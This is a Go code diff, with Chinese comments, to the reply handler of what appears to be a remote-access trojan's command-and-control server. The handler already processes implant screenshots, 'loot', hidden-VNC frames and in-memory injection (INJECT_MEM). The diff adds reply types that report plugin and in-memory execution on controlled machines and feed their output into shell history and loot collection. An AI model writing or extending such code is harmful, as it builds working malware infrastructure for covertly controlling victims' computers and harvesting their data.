@@ -23,6 +23,14 @@ var LootIngestFunc func(uid, output string)
 // dispatched 任务标为 completed。与 LootIngestFunc 同理，避免 pkg/command 反向依赖 pkg/api。
 var TaskOutputFunc func(uid, output string)
 
+// ExecDoneFunc 插件/内存执行完成回调（由 main 注入 api.OnExecDone）：
+// taskID>0 时精确收敛对应 exec 任务；=0 时回退最早一条 exec 任务。
+var ExecDoneFunc func(uid string, taskID int64, ok bool, errMsg string)
+
+// ExecOutputEnableFunc 能力客户端上报后，通知它把执行过程输出切到 EXEC_OUTPUT(98)。
+// 未通知前客户端仍用 type=0（兼容旧服务端）。
+var ExecOutputEnableFunc func(uid string)
+
 func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 	xtermBroadcast func(uid string, data []byte),
 	hvncBroadcast func(uid, sid string, frame []byte)) error {
@@ -56,6 +64,11 @@ func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 			// 清除截图期望状态
 			VarScreenshotQueue.SetScreenshotExpected(uid, false)
 		} else {
+			// 空回包直接忽略：INJECT_MEM 的中间分块会回 nil，原实现会追加空行
+			// 并触发 TaskOutputFunc，可能把一条无关任务误标成 completed。
+			if len(data) == 0 {
+				return nil
+			}
 			// 当作普通命令行输出处理
 			if !isExpectedScreenshot && len(data) > 100000 {
 				logx.Debugf("[%s] 大数据包但非截图上下文 - UID: %s, 长度: %d, 可能是其他大文件传输\n", listenerType, uid, len(data))
@@ -180,6 +193,51 @@ func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 		// （如 Windows ConPTY 功能暂禁用时用户能看到具体原因）
 		if xtermBroadcast != nil {
 			xtermBroadcast(uid, data)
+		}
+	case EXEC_OUTPUT:
+		// 执行过程输出：写 shell 历史（插件页从这里取实时/最终输出），
+		// 但**不**触发 TaskOutputFunc —— exec 任务的终态只由 EXEC_DONE 决定。
+		MarkExecOutputReady(uid)
+		MarkExecClientCapable(uid) // 收到 98 本身即证明能力（服务端重启后自愈）
+		if len(data) == 0 {
+			return nil
+		}
+		utf8Data, encodeErr := utils.ProcessShellOutput(data)
+		if encodeErr != nil {
+			utf8Data = data
+		}
+		database.AppendShellContent(uid, string(utf8Data)+"\n")
+		if LootIngestFunc != nil {
+			LootIngestFunc(uid, string(utf8Data))
+		}
+	case EXEC_DONE:
+		// 插件/内存执行结束回执：[4B taskID][1B ok][utf8 error]。
+		// 它同时是能力证明：服务端重启丢了能力表也能自愈。
+		if len(data) < 5 {
+			logx.Warnf("⚠️ [EXEC-DONE] 载荷过短 len=%d UID=%s", len(data), uid)
+			return nil
+		}
+		taskID := int64(binary.BigEndian.Uint32(data[:4]))
+		ok := data[4] != 0
+		msg := strings.TrimSpace(string(data[5:]))
+		MarkExecClientCapable(uid)
+		if !ok {
+			line := "[!] 执行失败"
+			if msg != "" {
+				line += ": " + msg
+			}
+			database.AppendShellContent(uid, line+"\n")
+		}
+		if ExecDoneFunc != nil {
+			ExecDoneFunc(uid, taskID, ok, msg)
+		}
+	case EXEC_CAP:
+		// 能力上报：[1B version]；version>=1 视为支持 EXEC_DONE / EXD1 / EXEC_OUTPUT。
+		if len(data) >= 1 && data[0] >= 1 {
+			MarkExecClientCapable(uid)
+			if ExecOutputEnableFunc != nil {
+				ExecOutputEnableFunc(uid)
+			}
 		}
 	case encrypt.KeyRotateAckReplyType:
 		// P3-1: 客户端确认密钥轮换（回包已用新密钥加密，服务端经 NextKey 解密成功即证明客户端持有新密钥）
